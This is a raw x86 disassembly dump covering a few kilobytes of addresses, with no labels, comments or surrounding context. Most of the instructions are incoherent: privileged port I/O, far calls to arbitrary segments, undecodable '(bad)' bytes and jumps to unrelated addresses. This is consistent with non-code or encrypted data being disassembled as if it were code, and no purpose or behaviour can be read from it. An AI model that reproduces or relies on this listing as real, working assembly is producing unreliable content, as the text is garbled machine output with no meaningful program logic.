  422916:	sbb    BYTE PTR [ebp+0x7f],cl
  422919:	mov    WORD PTR [edi+edx*8+0x10ce62eb],fs
  422920:	bnd call 0xb5d5abb9
  422926:	loop   0x42299e
  422928:	in     al,dx
  422929:	pop    esi
  42292a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42292b:	cmc    
  42292c:	mov    edx,0xe73ef9ed
  422931:	in     al,dx
  422932:	jnp    0x42298e
  422934:	push   eax
  422935:	mov    ds:0x27e9f56e,eax
  42293a:	fldcw  WORD PTR [esi+0x64aa308d]
  422940:	dec    eax
  422941:	xor    BYTE PTR [ebx+0x50419021],bl
  422947:	pusha  
  422948:	xchg   ecx,eax
  422949:	dec    esi
  42294a:	mov    ah,bh
  42294c:	test   al,0x6
  42294e:	add    BYTE PTR [edi+0x10],ah
  422951:	imul   esp,DWORD PTR [eax-0x4],0xffffffb8
  422955:	add    dl,cl
  422957:	or     eax,DWORD PTR [edi]
  422959:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42295a:	jg     0x422919
  42295c:	shr    BYTE PTR [esi+0x3d],0x64
  422960:	sahf   
  422961:	scas   eax,DWORD PTR es:[edi]
  422962:	lods   eax,DWORD PTR ds:[esi]
  422963:	cwde   
  422964:	adc    ah,BYTE PTR [ecx-0x161dd288]
  42296a:	loope  0x422967
  42296c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42296d:	fmul   QWORD PTR [edi]
  42296f:	sbb    BYTE PTR ds:0x9abd26c0,0x1c
  422976:	add    ch,ch
  422978:	pop    es
  422979:	hlt    
  42297a:	push   eax
  42297b:	pop    edi
  42297c:	jns    0x4229b2
  42297e:	neg    BYTE PTR [eax-0x84beb28]
  422984:	call   0x1bf2e498
  422989:	push   cs
  42298a:	sbb    BYTE PTR [ecx+0x19],cl
  42298d:	sbb    edx,ecx
  42298f:	in     al,0xaa
  422991:	jne    0x422998
  422993:	ins    BYTE PTR es:[edi],dx
  422994:	ret    
  422995:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422996:	inc    eax
  422997:	fisttp WORD PTR [ebx-0x66]
  42299a:	scas   eax,DWORD PTR es:[edi]
  42299b:	jae    0x422928
  42299d:	call   0x3ee7e94c
  4229a2:	push   ss
  4229a3:	sub    DWORD PTR [eax],0xcaa13c98
  4229a9:	rcr    DWORD PTR [bx+di+0x18],1
  4229ad:	jne    0x4229ac
  4229af:	xor    edx,ebx
  4229b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4229b2:	adc    al,BYTE PTR ds:[esi]
  4229b5:	popf   
  4229b6:	fwait
  4229b7:	dec    edx
  4229b8:	add    ch,BYTE PTR [ebx-0x5a]
  4229bb:	pop    ecx
  4229bc:	repnz repz push es
  4229bf:	(bad)
  4229c4:	imul   edi
  4229c6:	push   0xfffffffd
  4229c8:	out    0x4b,eax
  4229ca:	mov    bl,0x1b
  4229cc:	inc    esi
  4229cd:	pop    ds
  4229ce:	mov    ah,0x16
  4229d0:	fist   DWORD PTR [edi-0x25da59c6]
  4229d6:	sub    eax,0xe4532343
  4229db:	lock cmc 
  4229dd:	sbb    bl,dl
  4229df:	ror    DWORD PTR [eax+0x440e2c23],1
  4229e5:	or     DWORD PTR [eax],ebx
  4229e7:	or     edi,esp
  4229e9:	jp     0x422a02
  4229eb:	idiv   BYTE PTR ds:0x8910575e
  4229f1:	sub    edi,DWORD PTR [edx+0x49]
  4229f4:	pop    DWORD PTR [edi-0x5d075786]
  4229fa:	rcl    DWORD PTR [ebx+0x38],cl
  4229fd:	vcvtpd2uqq ymm3,YMMWORD PTR [esi-0x362cca7]
  422a07:	mov    dl,0x63
  422a09:	and    DWORD PTR [eax+0xa],ebx
  422a0c:	in     eax,dx
  422a0d:	(bad)  
  422a0e:	mov    bl,0xfd
  422a10:	sub    al,0x21
  422a12:	dec    ebx
  422a13:	cld    
  422a14:	xlat   BYTE PTR ds:[ebx]
  422a15:	scas   eax,DWORD PTR es:[edi]
  422a16:	push   0x4b
  422a18:	shl    BYTE PTR [edx-0x1d82631b],cl
  422a1e:	inc    ecx
  422a1f:	xor    eax,0x6cae3ffe
  422a24:	popa   
  422a25:	in     al,0x44
  422a27:	in     eax,0x22
  422a29:	in     eax,0xcb
  422a2b:	sbb    eax,0xdbd12cac
  422a30:	lds    edx,FWORD PTR [ebp-0x1d4cc06c]
  422a36:	inc    esi
  422a37:	sub    eax,0x252b208a
  422a3c:	ja     0xf465dd93
  422a42:	dec    esp
  422a43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422a44:	and    dh,BYTE PTR [ebx+0x3c5ae190]
  422a4a:	in     al,0x3d
  422a4c:	cwde   
  422a4d:	jne    0x4229de
  422a4f:	adc    edi,DWORD PTR [ecx+0x2940c8c]
  422a55:	test   al,0x48
  422a57:	iret   
  422a58:	xchg   ebp,eax
  422a59:	out    dx,eax
  422a5a:	xchg   esp,eax
  422a5b:	test   eax,0x9b95c0
  422a60:	bound  edx,QWORD PTR ds:0xcc4d3c17
  422a66:	mov    eax,ds:0xc3407de5
  422a6b:	popf   
  422a6c:	iret   
  422a6d:	repz dec esi
  422a6f:	sbb    DWORD PTR [ebp+0x693053e8],esp
  422a75:	mov    ds:0x49c2dda2,eax
  422a7a:	test   al,0x77
  422a7c:	adc    eax,0x5de053c9
  422a81:	imul   esi,DWORD PTR [eax],0xffffffb5
  422a84:	(bad)  
  422a85:	repnz pop edi
  422a87:	cdq    
  422a88:	repz fmul QWORD PTR [edx+0x73]
  422a8c:	fisttp QWORD PTR [edi+0x39]
  422a8f:	or     edi,edx
  422a91:	mov    DWORD PTR [ebx],ebx
  422a93:	call   0xa79895f1
  422a98:	mov    ds:0xe9a1bc8e,eax
  422a9d:	pop    esi
  422a9e:	shl    ebp,1
  422aa0:	mov    ecx,0x45332236
  422aa5:	cmc    
  422aa6:	fstp   TBYTE PTR ds:0xe32138ed
  422aac:	sub    ebx,edx
  422aae:	add    al,0xa0
  422ab0:	outs   dx,DWORD PTR ds:[esi]
  422ab1:	cmp    BYTE PTR [eax+ecx*1+0x6823836d],al
  422ab8:	in     al,dx
  422ab9:	dec    ecx
  422aba:	inc    esi
  422abb:	call   0xeaa3:0x4d736835
  422ac2:	pop    ss
  422ac3:	aad    0x48
  422ac5:	int3   
  422ac6:	mov    ebx,0x44dcb158
  422acb:	xchg   ebp,eax
  422acc:	cmp    ebp,DWORD PTR [eax+0x7cbc77ae]
  422ad2:	lds    ebp,FWORD PTR [esi-0x59]
  422ad5:	inc    edx
  422ad6:	call   0xe7308c7a
  422adb:	inc    edi
  422adc:	xchg   ebx,eax
  422add:	outs   dx,BYTE PTR ds:[esi]
  422ade:	add    dh,dl
  422ae0:	bound  ecx,QWORD PTR [ebx+0x3b]
  422ae3:	imul   eax,edx,0xf96680a6
  422ae9:	jecxz  0x422b43
  422aeb:	pop    ss
  422aec:	into   
  422aed:	add    edi,edi
  422aef:	mov    ch,0xf0
  422af1:	push   0xffffffe8
  422af3:	mov    esi,0x8b680ed1
  422af8:	scas   al,BYTE PTR es:[edi]
  422af9:	sbb    BYTE PTR ds:0x3bf06526,cl
  422aff:	adc    BYTE PTR [eax-0x30d3c1d9],ch
  422b05:	mov    DWORD PTR [ecx],ebx
  422b07:	fadd   QWORD PTR [edi+0x2f]
  422b0a:	mov    BYTE PTR [edx],bh
  422b0c:	out    0x73,eax
  422b0e:	cwde   
  422b0f:	push   esp
  422b10:	xor    BYTE PTR [edi],ah
  422b12:	scas   eax,DWORD PTR es:[edi]
  422b13:	dec    esp
  422b14:	je     0x422b55
  422b16:	jae    0x422acc
  422b18:	repz mov es,WORD PTR [ebp+0x124ac154]
  422b1f:	mov    edx,0x450e4054
  422b24:	or     eax,0xdb79f171
  422b29:	sub    BYTE PTR [esi],dh
  422b2b:	das    
  422b2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422b2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422b2e:	in     al,dx
  422b2f:	dec    eax
  422b30:	pop    eax
  422b31:	(bad)  
  422b32:	cli    
  422b33:	pop    edx
  422b34:	leave  
  422b35:	(bad)  [edx-0x3b]
  422b38:	jl     0x422b1f
  422b3a:	ret    0x95b8
  422b3d:	push   ss
  422b3e:	shl    BYTE PTR [eax*8-0x63168ffa],cl
  422b45:	cmp    DWORD PTR [eax-0x39e5ee77],0xffffffba
  422b4c:	test   BYTE PTR [edi-0x22],bl
  422b4f:	xor    BYTE PTR [ebx-0x10e2c24f],cl
  422b55:	jmp    0x422b74
  422b57:	clc    
  422b58:	mov    esi,0xf79fe65a
  422b5d:	test   eax,0x369f266d
  422b62:	sbb    dh,BYTE PTR [ebp-0x64eaa136]
  422b68:	stos   DWORD PTR es:[edi],eax
  422b69:	jbe    0x422b0c
  422b6b:	xchg   ebx,eax
  422b6c:	(bad)  
  422b6d:	pop    ss
  422b6e:	jns    0x422b5c
  422b70:	cmp    al,0xad
  422b72:	lock mov ebp,0xbdcd35b0
  422b78:	and    DWORD PTR ds:0x44fe8d5a,0xffffff8d
  422b7f:	bound  esp,QWORD PTR es:[edi+esi*1-0x786412ae]
  422b87:	stos   DWORD PTR es:[edi],eax
  422b88:	and    BYTE PTR [edi+0x45],0xf2
  422b8c:	ds mov esi,0x3fca305f
  422b92:	adc    DWORD PTR [esi-0x13],ebx
  422b95:	fisubr DWORD PTR [esi]
  422b97:	jbe    0x422b2e
  422b99:	xor    DWORD PTR [esi+0x2f],ecx
  422b9c:	mov    DWORD PTR [eax+0x1e],esp
  422b9f:	jb     0x422c1a
  422ba1:	jl     0x422c1d
  422ba3:	aad    0x94
  422ba5:	loopne 0x422b7f
  422ba7:	xchg   edi,eax
  422ba8:	aas    
  422ba9:	imul   edx,DWORD PTR [eax+edi*8-0x4],0x6664a2d8
  422bb1:	sub    BYTE PTR [ebx-0x7c],cl
  422bb4:	ins    DWORD PTR es:[edi],dx
  422bb5:	mov    dh,0xa7
  422bb7:	jg     0x422be5
  422bb9:	adc    eax,0xd5132b7d
  422bbe:	test   al,0x18
  422bc0:	jl     0x422ba1
  422bc2:	mov    ds:0xcc56eb73,eax
  422bc7:	push   esi
  422bc8:	mov    bh,0x62
  422bca:	sbb    eax,0x7daae945
  422bcf:	scas   al,BYTE PTR es:[edi]
  422bd0:	mov    ds:0x211ce698,eax
  422bd5:	jno    0x422c01
  422bd7:	push   esp
  422bd8:	mov    ?,WORD PTR [edx]
  422bda:	fnstenv [eax+eiz*4]
  422bdd:	cmp    DWORD PTR [ebp-0xc],eax
  422be0:	sub    eax,0x9bd0015
  422be5:	xchg   ebp,eax
  422be6:	out    dx,eax
  422be7:	out    dx,al
  422be8:	imul   esi,DWORD PTR [ecx-0x4a],0x39199ec6
  422bef:	mov    ecx,0x4423a102
  422bf4:	clc    
  422bf5:	pop    ds
  422bf6:	sub    al,0x4b
  422bf8:	add    ah,BYTE PTR [ebp+0x419cc841]
  422bfe:	jne    0x422c47
  422c00:	mov    cl,0x6a
  422c02:	cmp    ebx,DWORD PTR [ebx-0x303fa38d]
  422c08:	shl    DWORD PTR [eax+0x14f79006],1
  422c0e:	jbe    0x422bce
  422c10:	outs   dx,BYTE PTR ds:[esi]
  422c11:	sub    al,0xe3
  422c13:	mov    al,0x16
  422c15:	pop    edi
  422c16:	adc    al,0x3
  422c18:	stc    
  422c19:	outs   dx,DWORD PTR ds:[esi]
  422c1a:	pusha  
  422c1b:	daa    
  422c1c:	inc    eax
  422c1d:	call   0xc22d:0x1d838053
  422c24:	pop    edi
  422c25:	mov    DWORD PTR [esi+edx*2-0x7b02b9bc],eax
  422c2c:	xor    al,0xd8
  422c2e:	jo     0x422c04
  422c30:	inc    eax
  422c31:	sub    al,0x12
  422c33:	dec    esi
  422c34:	stos   BYTE PTR es:[edi],al
  422c35:	pop    edi
  422c36:	lods   al,BYTE PTR ds:[esi]
  422c37:	lock sar DWORD PTR ds:0x27e68a4e,0x4c
  422c3f:	dec    edi
  422c40:	inc    esi
  422c41:	outs   dx,BYTE PTR ds:[esi]
  422c42:	cmp    eax,0xbf94ddab
  422c47:	rol    BYTE PTR ss:0x48d3cd25,cl
  422c4e:	mov    ah,0xeb
  422c50:	xchg   ebx,eax
  422c51:	jnp    0x422c4a
  422c53:	mov    cl,0xf5
  422c55:	push   esp
  422c56:	pause  
  422c58:	xchg   esi,eax
  422c59:	add    al,0x8f
  422c5b:	or     BYTE PTR [ecx-0x53],0x56
  422c5f:	dec    eax
  422c60:	sub    BYTE PTR [esi],0xf7
  422c63:	mov    esp,0x3ba0e6b0
  422c68:	shl    DWORD PTR [ecx+eiz*2+0x6fdabd0],1
  422c6f:	icebp  
  422c70:	outs   dx,BYTE PTR ds:[esi]
  422c71:	push   ds
  422c72:	sub    eax,0x368cea6a
  422c77:	pop    esi
  422c78:	call   0x4070:0xe46514f5
  422c7f:	inc    edx
  422c80:	push   es
  422c81:	jne    0x422cc6
  422c83:	sbb    DWORD PTR [edi-0x43],edx
  422c86:	sti    
  422c87:	fsub   QWORD PTR [ecx+ecx*4-0x7918792b]
  422c8e:	dec    ebp
  422c8f:	push   ds
  422c90:	sub    eax,0x992856af
  422c95:	push   edx
  422c96:	dec    sp
  422c98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422c99:	add    edi,ebx
  422c9b:	push   0xffffff8f
  422c9d:	mov    WORD PTR [ebx+0x422e59ec],ss
  422ca3:	xor    al,BYTE PTR [ecx]
  422ca5:	add    BYTE PTR [esi+0x79],bl
  422ca8:	lahf   
  422ca9:	loope  0x422cf8
  422cab:	pop    esp
  422cac:	lea    esp,es:[edi]
  422caf:	push   0x34ed495a
  422cb4:	xor    BYTE PTR [edx+ebx*2-0x45],dl
  422cb8:	add    eax,0xb24d4118
  422cbd:	icebp  
  422cbe:	jmp    0x99438ba3
  422cc3:	push   cs
  422cc4:	out    dx,al
  422cc5:	in     eax,dx
  422cc6:	inc    ecx
  422cc7:	iret   
  422cc8:	push   0x2a
  422cca:	sbb    eax,0x8022f3ec
  422ccf:	push   cs
  422cd0:	enter  0x6f5f,0x22
  422cd4:	repz mov bh,0x57
  422cd7:	cmp    BYTE PTR [edx-0x4e],ah
  422cda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422cdb:	xor    DWORD PTR [edi],ebp
  422cdd:	push   0xffffffa4
  422cdf:	adc    ebx,DWORD PTR [edi+0x1f]
  422ce2:	jmp    0xc0de:0x57d7aad8
  422ce9:	jae    0x422d56
  422ceb:	add    eax,0x66eb5fd7
  422cf0:	aam    0x42
  422cf2:	adc    al,0x59
  422cf4:	xor    ebx,DWORD PTR [ebp+0x2]
  422cf7:	sbb    al,0xc3
  422cf9:	and    al,0x5f
  422cfb:	das    
  422cfc:	fldcw  WORD PTR [eax]
  422cfe:	add    DWORD PTR [ecx],ebp
  422d00:	inc    esi
  422d01:	push   eax
  422d02:	es adc eax,0x91ee90ea
  422d08:	pop    esp
  422d09:	push   ebp
  422d0a:	cmc    
  422d0b:	xchg   esi,eax
  422d0c:	repnz and eax,0x73c5088a
  422d12:	jg     0x422d78
  422d14:	add    DWORD PTR [esi],edx
  422d16:	(bad)  
  422d17:	into   
  422d18:	pop    ebx
  422d19:	jbe    0x422cce
  422d1b:	jle    0x422ccf
  422d1d:	pop    eax
  422d1e:	mov    ah,BYTE PTR [esi+0x56a25edf]
  422d24:	aad    0xae
  422d26:	das    
  422d27:	mov    bh,0x7a
  422d29:	pop    ebp
  422d2a:	or     eax,0xda134036
  422d2f:	dec    DWORD PTR [ebp+0x13]
  422d32:	adc    edx,0xffffffa6
  422d35:	les    ecx,FWORD PTR [ebp+0x9]
  422d38:	inc    edi
  422d39:	push   edi
  422d3a:	das    
  422d3b:	test   DWORD PTR ss:[ecx],ebx
  422d3e:	pop    ecx
  422d3f:	sbb    eax,DWORD PTR [eax]
  422d41:	or     al,0xfb
  422d43:	push   0x41
  422d45:	sbb    BYTE PTR [ecx],cl
  422d47:	and    esi,DWORD PTR [edx-0x207f5e04]
  422d4d:	or     BYTE PTR [eax+ebp*8-0x1cbe1ec8],dl
  422d54:	sub    BYTE PTR [ebp+edx*8+0x2c],dh
  422d58:	shl    ch,0xdb
  422d5b:	dec    edx
  422d5c:	sub    al,0xbd
  422d5e:	mov    edx,0x88cf8eed
  422d63:	das    
  422d64:	jbe    0x422d01
  422d66:	dec    ebx
  422d67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422d68:	pop    ss
  422d69:	pop    es
  422d6a:	scas   eax,DWORD PTR es:[edi]
  422d6b:	xchg   edx,eax
  422d6c:	call   0xecf12fe9
  422d71:	and    BYTE PTR [eax+0x37],bh
  422d74:	mov    edx,0x3e66f7cf
  422d79:	pop    edx
  422d7a:	sar    DWORD PTR gs:0x17aa65e9,1
  422d81:	dec    ebx
  422d82:	leave  
  422d83:	jp     0x422df8
  422d85:	lods   eax,DWORD PTR ds:[esi]
  422d86:	clc    
  422d87:	xor    dl,cl
  422d89:	dec    ecx
  422d8a:	cmp    ebp,DWORD PTR [esi+0x3]
  422d8d:	mov    ecx,DWORD PTR [edx]
  422d8f:	sti    
  422d90:	aad    0x22
  422d92:	pop    es
  422d93:	xchg   edx,esp
  422d95:	leave  
  422d96:	sbb    DWORD PTR [ecx],ebp
  422d98:	sub    DWORD PTR [edi],edx
  422d9a:	dec    BYTE PTR [edx+ebp*1-0x47]
  422d9e:	and    cl,BYTE PTR [edi-0x59a74be2]
  422da4:	lfs    eax,FWORD PTR [ebx-0x2dc93a66]
  422dab:	cwde   
  422dac:	push   esp
  422dad:	int3   
  422dae:	es xchg ebx,eax
  422db0:	outs   dx,DWORD PTR ds:[esi]
  422db1:	push   0xcc4ff7ec
  422db6:	(bad)  
  422db7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422db8:	(bad)  
  422db9:	retf   0x22f2
  422dbc:	inc    ecx
  422dbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422dbe:	adc    ebx,DWORD PTR [esi-0x20]
  422dc1:	sub    BYTE PTR [eax],cl
  422dc3:	mov    ds:0xbc536f81,al
  422dc8:	mov    dh,0x8f
  422dca:	jnp    0x422e2e
  422dcc:	push   edx
  422dcd:	xor    eax,0xb5532061
  422dd2:	mov    bh,0xd8
  422dd4:	es repz gs mov ecx,0xb0746f32
  422ddc:	cmc    
  422ddd:	sub    al,0x39
  422ddf:	mov    bh,0x65
  422de1:	lods   eax,DWORD PTR ds:[esi]
  422de2:	jae    0x422e1e
  422de4:	mov    ds:0x12e96c25,al
  422de9:	pop    ebp
  422dea:	imul   ecx,edx,0x45837e63
  422df0:	mov    edx,0x93cfb43c
  422df5:	and    DWORD PTR [ecx-0x39e51f56],0xffffffd8
  422dfc:	sub    BYTE PTR [ebx-0x66af51ed],ah
  422e02:	xchg   edi,eax
  422e03:	or     DWORD PTR [edx+0x68],edx
  422e06:	loope  0x422e4d
  422e08:	dec    ecx
  422e09:	dec    ecx
  422e0a:	pop    ebp
  422e0b:	adc    al,0xbf
  422e0d:	adc    BYTE PTR [esi],dh
  422e0f:	jne    0x422d9b
  422e11:	call   0x671e:0xf659a09f
  422e18:	add    ecx,edi
  422e1a:	les    edi,FWORD PTR [ecx-0x5d]
  422e1d:	lea    ebp,[ebp+edi*1-0x2cab9856]
  422e24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422e25:	push   0xffffffe2
  422e27:	dec    ecx
  422e28:	and    ch,BYTE PTR [ebx]
  422e2a:	icebp  
  422e2b:	pushf  
  422e2c:	mov    eax,0xe450b8b
  422e31:	jg     0x422e33
  422e33:	outs   dx,BYTE PTR ds:[esi]
  422e34:	xchg   esi,eax
  422e36:	js     0x422e0d
  422e38:	into   
  422e39:	adc    al,0xe5
  422e3b:	sub    dh,ch
  422e3d:	das    
  422e3e:	(bad)  
  422e40:	jbe    0x422ebd
  422e42:	mov    ch,BYTE PTR [ecx]
  422e44:	out    0x7a,al
  422e46:	mov    ecx,0x1b7e5bb3
  422e4b:	mov    ecx,DWORD PTR [edi-0x6c]
  422e4e:	dec    edi
  422e4f:	outs   dx,DWORD PTR ds:[esi]
  422e50:	nop
  422e51:	pop    edx
  422e52:	adc    eax,0x747727fb
  422e58:	cs (bad) 
  422e5b:	nop
  422e5c:	xor    eax,DWORD PTR [ebx]
  422e5e:	std    
  422e5f:	xchg   ebx,eax
  422e60:	shl    DWORD PTR [eax],cl
  422e62:	sub    WORD PTR [ecx+ebp*2-0x39],0xf1d1
  422e69:	js     0x422e9a
  422e6b:	and    eax,0xd8720091
  422e70:	dec    edi
  422e71:	mov    eax,0x494ba0c3
  422e76:	mov    ebp,0x2c9917b6
  422e7b:	call   0x80282dc7
  422e80:	xchg   DWORD PTR [ecx],ebx
  422e82:	outs   dx,DWORD PTR ds:[esi]
  422e83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422e84:	cs mov esi,0x9d7f67bc
  422e8a:	jae    0x422e68
  422e8c:	xchg   edx,eax
  422e8d:	out    dx,al
  422e8e:	xchg   ebx,eax
  422e8f:	push   ss
  422e90:	push   cs
  422e91:	cwde   
  422e92:	mov    esi,0xfba0a1e7
  422e97:	adc    al,0xba
  422e99:	ret    
  422e9a:	mov    ch,0x41
  422e9c:	xlat   BYTE PTR ds:[ebx]
  422e9d:	leave  
  422e9e:	push   es
  422e9f:	mov    ah,0x29
  422ea1:	out    0xd9,eax
  422ea3:	add    ch,BYTE PTR [ecx-0x79bb4794]
  422ea9:	test   DWORD PTR [ebx+0x65],edx
  422eac:	or     eax,0x87738cb8
  422eb1:	push   0xd0a21334
  422eb6:	sub    BYTE PTR ds:0xa3a2b78a,ah
  422ebc:	dec    eax
  422ebd:	pop    ds
  422ebe:	aaa    
  422ebf:	sbb    ch,BYTE PTR [ebp-0x408b8149]
  422ec5:	mov    al,ds:0xbe70722a
  422eca:	sbb    al,0x9b
  422ecc:	fwait
  422ecd:	pop    ds
  422ece:	adc    eax,0x273c40bd
  422ed3:	dec    esi
  422ed4:	pop    ebx
  422ed5:	mov    edx,DWORD PTR [ebx+0x2c8504b5]
  422edb:	into   
  422edc:	sub    BYTE PTR [ecx-0x5876b0a6],ah
  422ee2:	lock mov gs,WORD PTR [ecx]
  422ee5:	retf   
  422ee6:	leave  
  422ee7:	arpl   WORD PTR [eax],sp
  422ee9:	ins    DWORD PTR es:[edi],dx
  422eea:	mov    ds:0xf89c3b6c,eax
  422eef:	and    BYTE PTR [eax+eax*8],0xb1
  422ef3:	pushf  
  422ef4:	or     ebx,DWORD PTR [edi+0x77c34774]
  422efa:	imul   ebx,DWORD PTR [eax+edx*4],0xb081cba4
  422f01:	out    0x4b,al
  422f03:	lods   al,BYTE PTR ds:[esi]
  422f04:	rcl    DWORD PTR [edx-0x7],cl
  422f07:	(bad)  
  422f08:	mov    ds:0xd57e2e78,al
  422f0d:	out    dx,al
  422f0e:	jb     0x422eba
  422f10:	xor    cl,BYTE PTR [edi+0x33]
  422f13:	jp     0x422e96
  422f15:	push   ss
  422f16:	pop    edi
  422f17:	push   ebp
  422f18:	ret    0x99e7
  422f1b:	xor    BYTE PTR [edx],dh
  422f1d:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422f1f:	in     eax,dx
  422f20:	mov    ?,esi
  422f22:	inc    esi
  422f23:	inc    edx
  422f24:	jns    0x422f19
  422f26:	xor    dl,bl
  422f28:	out    dx,al
  422f29:	in     eax,dx
  422f2a:	daa    
  422f2b:	scas   eax,DWORD PTR es:[edi]
  422f2c:	rol    BYTE PTR [edi-0x3bf4cb3e],cl
  422f32:	mov    DWORD PTR [ecx+0x235aab82],ebp
  422f38:	lods   al,BYTE PTR ds:[esi]
  422f39:	or     al,0xa4
  422f3b:	dec    BYTE PTR [edx+esi*8-0x4c360e8a]
  422f42:	ins    DWORD PTR es:[edi],dx
  422f43:	cmp    ah,BYTE PTR [esi-0x28]
  422f46:	outs   dx,DWORD PTR ds:[si]
  422f48:	scas   al,BYTE PTR es:[edi]
  422f49:	and    esp,ebx
  422f4b:	mov    gs,esi
  422f4d:	in     eax,0x38
  422f4f:	sub    BYTE PTR [esi-0xf5f3f4a],cl
  422f55:	xor    esp,eax
  422f57:	test   BYTE PTR [ecx],bh
  422f59:	int3   
  422f5a:	jno    0x422f4d
  422f5c:	icebp  
  422f5d:	mov    BYTE PTR [eax],0x5d
  422f60:	mov    al,0x52
  422f62:	or     al,0x87
  422f64:	and    edx,DWORD PTR [eax-0x17]
  422f67:	ss test al,0x12
  422f6a:	fcmovne st,st(3)
  422f6c:	int    0xb3
  422f6e:	clc    
  422f6f:	mov    BYTE PTR [edi+0xd],al
  422f72:	mov    al,0xec
  422f74:	jo     0x422f41
  422f76:	aad    0x43
  422f78:	and    al,0xe0
  422f7a:	lds    edi,FWORD PTR [eax]
  422f7c:	mov    bl,0x60
  422f7e:	stos   BYTE PTR es:[edi],al
  422f7f:	add    al,cl
  422f81:	and    eax,0x24e9036d
  422f86:	pop    es
  422f87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422f88:	rcl    BYTE PTR [edx-0x5],cl
  422f8b:	ds mov al,0x96
  422f8e:	inc    edx
  422f8f:	ds aaa 
  422f91:	shr    DWORD PTR [edx-0x7c],1
  422f94:	test   BYTE PTR [edx],dh
  422f96:	and    DWORD PTR [esi],ebx
  422f98:	mov    al,0x5b
  422f9a:	(bad)  
  422f9b:	jns    0x422fd7
  422f9d:	jnp    0x422ff6
  422f9f:	xchg   edx,eax
  422fa0:	addr16 das 
  422fa2:	dec    ebx
  422fa3:	(bad)  
  422fa4:	mov    ah,ah
  422fa6:	pop    ds
  422fa7:	xchg   edx,eax
  422fa8:	mov    esi,0x7ff867dd
  422fad:	fisubr WORD PTR [ebx]
  422faf:	sbb    ch,BYTE PTR [esi+eax*2+0x2198a897]
  422fb6:	dec    esi
  422fb7:	sbb    al,0xfa
  422fb9:	mov    ah,BYTE PTR [edi+eax*8-0x50]
  422fbd:	test   al,0xcd
  422fbf:	add    esp,DWORD PTR [ebx]
  422fc1:	push   ds
  422fc2:	sub    BYTE PTR [edx],bh
  422fc4:	inc    BYTE PTR [ebp+0x27]
  422fc7:	cli    
  422fc8:	and    eax,0x82858d70
  422fcd:	xor    eax,0xef8aec06
  422fd3:	dec    edi
  422fd4:	cwde   
  422fd5:	add    eax,0x8ff2fcc1
  422fda:	mov    edi,esp
  422fdc:	pop    esi
  422fdd:	pop    esi
  422fde:	out    0xab,eax
  422fe0:	retf   
  422fe1:	jl     0x423013
  422fe3:	mov    dh,0x3f
  422fe5:	mov    ebp,0x5a5bac3d
  422fea:	fldcw  WORD PTR [edx]
  422fec:	inc    ebx
  422fed:	fisttp QWORD PTR [eax-0x15b327fa]
  422ff3:	dec    edi
  422ff4:	iret   
  422ff5:	rcr    DWORD PTR [edi+0x67],1
  422ff8:	test   eax,0x91deae0
  422ffd:	ja     0x422fc6
  422fff:	icebp  
  423000:	xchg   ebp,eax
  423001:	fdiv   DWORD PTR [ebx]
  423003:	pop    eax
  423004:	not    DWORD PTR [edx]
  423006:	add    eax,0xd5448fb6
  42300b:	mov    ecx,0x2a72eef1
  423010:	mov    ah,BYTE PTR [ecx]
  423012:	gs ins DWORD PTR es:[edi],dx
  423014:	mov    edx,0x5e42b0c7
  423019:	jg     0x422fca
  42301b:	inc    edx
  42301c:	cld    
  42301d:	ss mov ecx,0x4a84f9c4
  423023:	rol    DWORD PTR [edx+ebp*1+0x44],cl
  423027:	xchg   esi,eax
  423028:	dec    edx
  423029:	ins    BYTE PTR es:[edi],dx
  42302a:	shr    dh,0x4e
  42302d:	(bad)  [edi]
  42302f:	int    0xd8
  423031:	ret    0x9b05
  423034:	ss mov ah,0x37
  423037:	sbb    BYTE PTR [ecx],bh
  423039:	push   eax
  42303a:	loopne 0x423035
  42303c:	call   0xa3fe:0x103329b0
  423043:	inc    edi
  423044:	inc    edx
  423045:	loope  0x423070
  423047:	push   ecx
  423048:	sub    eax,0xaac9dcdc
  42304d:	ror    BYTE PTR [esi+0x3d3f6c55],1
  423053:	jmp    0x499786c1
  423058:	iret   
  423059:	mov    eax,0xb5bbaca4
  42305e:	(bad)  
  42305f:	fcomi  st,st(2)
  423061:	cmp    esi,ecx
  423063:	imul   edx,DWORD PTR [ebp+0x52],0x994a905b
  42306a:	cld    
  42306b:	fsubr  st(0),st
  42306d:	mov    ch,0x6a
  42306f:	push   ecx
  423070:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423071:	pop    esp
  423072:	outs   dx,BYTE PTR ds:[esi]
  423073:	xchg   esp,eax
  423074:	add    eax,0x734e6f6e
  423079:	cmp    DWORD PTR [eax-0x35],0x8d6340e1
  423080:	call   edx
  423082:	pop    ecx
  423083:	test   BYTE PTR [ecx],ch
  423085:	shl    BYTE PTR [edx],1
  423087:	push   0x998efc04
  42308c:	cmp    dl,BYTE PTR [ebx+0x7465a874]
  423092:	in     eax,dx
  423093:	mov    ebp,0x4789c4b5
  423098:	inc    eax
  423099:	and    edi,DWORD PTR [edx+0x7009ff6b]
  42309f:	mov    al,ds:0x21acca26
  4230a4:	push   esp
  4230a5:	inc    esp
  4230a6:	aaa    
  4230a7:	loopne 0x42308d
  4230a9:	pop    ebp
  4230aa:	sbb    ecx,DWORD PTR [eax-0x7add333c]
  4230b0:	(bad)  
  4230b1:	pop    edx
  4230b2:	cwde   
  4230b3:	jmp    0x9b:0xe07837cd
  4230ba:	(bad)  
  4230bb:	loop   0x423060
  4230bd:	(bad)  
  4230be:	imul   esi,DWORD PTR [edx-0x2b749238],0xffffffef
  4230c5:	mov    edi,0xfdea6864
